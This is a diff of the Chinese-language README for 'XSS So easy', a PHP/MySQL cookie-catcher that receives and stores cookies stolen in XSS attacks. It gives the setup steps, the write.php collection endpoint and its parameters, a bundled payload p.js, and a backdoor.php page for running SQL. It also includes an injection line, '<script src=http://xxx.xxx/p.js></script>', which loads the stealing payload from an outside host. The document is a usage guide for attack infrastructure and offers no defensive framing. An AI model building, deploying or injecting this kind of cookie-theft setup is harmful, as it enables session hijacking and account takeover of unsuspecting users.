@@ -1,18 +1,19 @@
-﻿#XSS So easy
+#XSS So easy
 ##简介
-此网站用于XSS Cookie 劫持攻击中接收Cookie  
-花了半天写出来，简单美化一下，不知道外观如何  
-适用于 PHP MySQL  
+此网站用于XSS Cookie 劫持攻击中接收并储存Cookie。  
+适用于 PHP MySQL。  
 
 ##使用方法
-配置config.php，填写数据库用户名、密码等信息。  
-install.php：创建数据库、表等操作  
-write.php：GET或者POST得到的Cookie。  
-需要提交的参数为domain location toplocation cookie opener。  
-含有payload：p.js  
+###安装配置
+1. 配置`config.php`，填写数据库用户名、密码等信息。  
+2. 访问`install.php`：创建数据库、表等操作。
+###使用  
+通过`write.php`，GET或者POST方法传输获取到的Cookie。  
+可供提交的参数为`domain location toplocation cookie opener`。其中`domain`必填。  
+含有payload：`p.js`。  
 
 ##附加功能
-读、写密码  
+各个页面的访问密码  
 自定义网站名称（title和页面中显示）  
 自定义开发者信息（底部显示）  
 
@@ -44,7 +45,7 @@ CSS文件已改为PHP文件读写。
 
 ###2015-10-20 15:45:32
 修改数据库，更改url字段名为location并允许NULL，增加toplocation（用于框架）、opener。  
-从旧的数据库变更请在backdoor.php执行SQL命令：  
+**从旧的数据库变更请在backdoor.php执行SQL命令**：  
 
 	alter table info change url location longtext NULL
 	alter table info add toplocation longtext
@@ -54,3 +55,9 @@ CSS文件已改为PHP文件读写。
 
 增加p.js作为payload，修改内部write.php域名和路径即可使用。  
 `<script src=http://xxx.xxx/p.js></script>`  
+
+###2015年11月19日 21:43:46
+近期更新：  
+  
+- `read.php`默认的倒序排序，增加删除键，调整样式  
+- 改进`backdoor.php`交互设计
